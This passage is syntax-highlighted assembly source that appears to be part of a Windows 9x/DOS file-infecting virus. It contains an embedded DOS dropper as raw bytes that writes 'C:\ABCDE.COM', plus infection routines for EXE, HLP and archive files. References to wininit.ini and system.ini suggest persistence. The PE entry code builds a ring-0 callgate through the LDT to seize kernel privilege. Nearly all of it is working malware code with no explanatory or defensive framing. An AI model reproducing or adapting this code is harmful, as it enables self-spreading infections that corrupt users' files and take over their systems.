        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">41H</span><span class="sc4">,</span><span class="sc2">7EH</span><span class="sc4">,</span><span class="sc2">47H</span><span class="sc4">,</span><span class="sc2">46H</span><span class="sc4">,</span><span class="sc2">46H</span><span class="sc4">,</span><span class="sc2">79H</span><span class="sc4">,</span><span class="sc2">3BH</span><span class="sc0">
</span><span class="sc5">LEN_UUD</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RUN_DROPPER_LB</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">RDROP_CON</span><span class="sc0">
</span><span class="sc5">RDROP_CON_LB</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0BEH</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0ACH</span><span class="sc4">,</span><span class="sc2">98H</span><span class="sc4">,</span><span class="sc2">93H</span><span class="sc4">,</span><span class="sc2">88H</span><span class="sc4">,</span><span class="sc2">38H</span><span class="sc4">,</span><span class="sc2">0ACH</span><span class="sc4">,</span><span class="sc2">3CH</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc2">74H</span><span class="sc4">,</span><span class="sc2">0FBH</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc4">,</span><span class="sc2">0BBH</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc4">,</span><span class="sc2">6FH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0B1H</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc4">,</span><span class="sc2">63H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">8BH</span><span class="sc4">,</span><span class="sc2">54H</span><span class="sc4">,</span><span class="sc2">26H</span><span class="sc4">,</span><span class="sc2">8BH</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc4">,</span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">42H</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc2">59H</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc4">,</span><span class="sc2">53H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc4">,</span><span class="sc2">91H</span><span class="sc4">,</span><span class="sc2">8BH</span><span class="sc4">,</span><span class="sc2">0FAH</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">FIRST_DROP_MASK</span><span class="sc0">
</span><span class="sc5">OFF_MASK1</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1234H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">31H</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SECOND_DROP_MASK</span><span class="sc0">
</span><span class="sc5">RELO_MASK2</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">OFF_MASK1</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1234H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">47H</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc4">,</span><span class="sc2">0F8H</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc2">0BBH</span><span class="sc4">,</span><span class="sc2">11H</span><span class="sc4">,</span><span class="sc2">60H</span><span class="sc4">,</span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">12H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">59H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc4">,</span><span class="sc2">33H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc2">0BCH</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0B3H</span><span class="sc4">,</span><span class="sc2">41H</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">4AH</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc2">0BBH</span><span class="sc4">,</span><span class="sc2">0EBH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">8CH</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">8CH</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">8CH</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc4">,</span><span class="sc2">0CH</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4BH</span><span class="sc4">,</span><span class="sc2">56H</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc4">,</span><span class="sc2">0CH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc4">,</span><span class="sc2">17H</span><span class="sc4">,</span><span class="sc2">0BCH</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc4">,</span><span class="sc2">1FH</span><span class="sc4">,</span><span class="sc2">5EH</span><span class="sc4">,</span><span class="sc2">6AH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">41H</span><span class="sc4">,</span><span class="sc2">8BH</span><span class="sc4">,</span><span class="sc2">0D6H</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc2">0C3H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc4">,</span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">0F9H</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0EBH</span><span class="sc4">,</span><span class="sc2">0F6H</span><span class="sc4">,</span><span class="sc2">0F9H</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc4">,</span><span class="sc2">6CH</span><span class="sc4">,</span><span class="sc2">71H</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc2">0BEH</span><span class="sc4">,</span><span class="sc2">0DFH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">72H</span><span class="sc4">,</span><span class="sc2">0E5H</span><span class="sc4">,</span><span class="sc2">93H</span><span class="sc4">,</span><span class="sc2">0C3H</span><span class="sc0">       
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc13">'C:\'
</span><span class="sc0">        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">RDROP_NAME</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'ABCDE.COM'</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">5CH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6CH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LEN_RDROP_CON</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RDROP_CON_LB</span><span class="sc0">
</span><span class="sc1">;DOSDROP.COM END</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INF_PROCS</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">INF_EXE</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">INF_HLP</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">INF_RAR</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">INF_ZIP</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">INF_ARJ</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">INF_HA</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">COMMAND_PIF</span><span class="sc0">
</span><span class="sc5">C_PIF_RELO</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'command.pif'</span><span class="sc0">
</span><span class="sc5">LEN_COMMAND_PIF</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">C_PIF_RELO</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">WININIT_INI</span><span class="sc0">
</span><span class="sc5">W_INI_RELO</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'wininit.ini'</span><span class="sc0">
</span><span class="sc5">LEN_WININIT_INI</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">W_INI_RELO</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SYSTEM_INI</span><span class="sc0">
</span><span class="sc5">S_INI_RELO</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'system.ini'</span><span class="sc0">
</span><span class="sc5">LEN_SYSTEM_INI</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">S_INI_RELO</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY POINT HERE FOR PE-FILES</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">PE_INSTALL_POP</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">],</span><span class="sc2">1234H</span><span class="sc0">   </span><span class="sc1">;FOR CALL</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ENCRYPTOR_LEN</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc5">INTRUD_OFF</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">PE_INSTALL</span><span class="sc0">
</span><span class="sc5">GATE_ADDR</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">ENTERD</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;FOR JMP</span><span class="sc0">
        </span><span class="sc6">PUSHFD</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SET_SEH</span><span class="sc0">
</span><span class="sc5">PROCESS_SEH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">     </span><span class="sc1">;ESTABLISHERFRAME (+8)</span><span class="sc0">
</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;REMOVE OUR EXCEPTION HANDLER</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc5">RW_LOCAL_RELO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_REST_HOST</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_LOADER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc5">IOFF_LOCAL_RELO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">+</span><span class="sc5">OLDP_LOCAL_RELO</span><span class="sc4">-</span><span class="sc5">LEN_LOADER</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
</span><span class="sc5">NO_REST_HOST</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">POPFD</span><span class="sc0">
        </span><span class="sc5">LEAVED</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">RESTORE_REGS</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_FILL_RESTORE</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90H</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;(MOV DREG,[ESP+XXXXXXXX])[4]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INTRUD_OFF</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">IOFF_LOCAL_RELO</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">PROCESS_SEH</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0"> </span><span class="sc2">1234H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">COUNT_RET</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SET_SEH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EBX</span><span class="sc4">],</span><span class="sc8">ESP</span><span class="sc0">        </span><span class="sc1">;SET OUR EXCEPTION HANDLER</span><span class="sc0">
        </span><span class="sc6">SLDT</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">EXIT</span><span class="sc0">            </span><span class="sc1">;NO LDT? (WIN NT)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">OUR_PORT</span><span class="sc0">
        </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">WE_HERE</span><span class="sc0">      </span><span class="sc1">;WE'RE ALREADY IN MEMORY?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">;EXIT</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">RW_OR_RO</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">RW_LOCAL_RELO</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">PROCESS_SEH</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">RW_LOCAL_EXIT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EXIT</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SGDT</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;FIND LDT LINEAR ADDRESS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc5">ESI.ECX.1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc5">ESI.ECX.SEL_BASE_HIGH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc5">ESI.ECX.SEL_LIMIT_LOW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SHRD</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;GET LINEAR ADDRESS OF LDT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">         </span><span class="sc1">;GET LIMIT OF LDT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FIND_FREE_SEL</span><span class="sc0">       </span><span class="sc1">;FIND NON-USED DESCRIPTOR</span><span class="sc0">
</span><span class="sc5">GO_EXIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">         </span><span class="sc1">;FOR R0 CS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">NO_FREE_SEL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">GO1_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO_EXIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">GATE_ADDR</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">;AND FOR CALLGATE SELECTOR</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CALC_DELTA</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">PE_OFF_R0_INSTALL</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">               </span><span class="sc1">;MAKE CALLGATE DESCRIPTOR</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">11101100B</span><span class="sc0"> </span><span class="sc1">;P=1:DPL=3:S=0:TYPE=0CH (CALLGATE)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">         </span><span class="sc1">;MAKE R0 CS DESCRIPTOR</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;LIMIT=0FFFFH</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">1100111110011010B</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;G=1:32BIT:AVL=0:LIMIT=0FH</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">               </span><span class="sc1">;P=1:DPL=0:S=1:CODE:NONCONF:READ=1:NOACCESS</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">INTRUD_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_LOADER</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
</span><span class="sc5">_SCASB</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">SCASB</span><span class="sc0">               </span><span class="sc1">;LOAD CODE PAGE(S) INTO MEMORY</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">_SCASB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GATE_ADDR</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO1_EXIT</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OUR_LEN</span><span class="sc0">

</span><span class="sc5">INIT_PAGE_NUM</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">OUR_LEN</span><span class="sc4">+</span><span class="sc2">0FFFH</span><span class="sc4">)/</span><span class="sc2">1000H</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ZERO INITIALIZED DATA</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ZERO_INIT</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OLD_PECODE</span><span class="sc0">
</span><span class="sc5">OLDP_LOCAL_RELO</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">PROCESS_SEH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_LOADER</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SHELL_FLAG</span><span class="sc0">
</span><span class="sc5">SHELL_FLAG_RELO</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SYS_PATH</span><span class="sc0">
</span><span class="sc5">SYS_PATH_RELO</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">FLAG</span><span class="sc0">
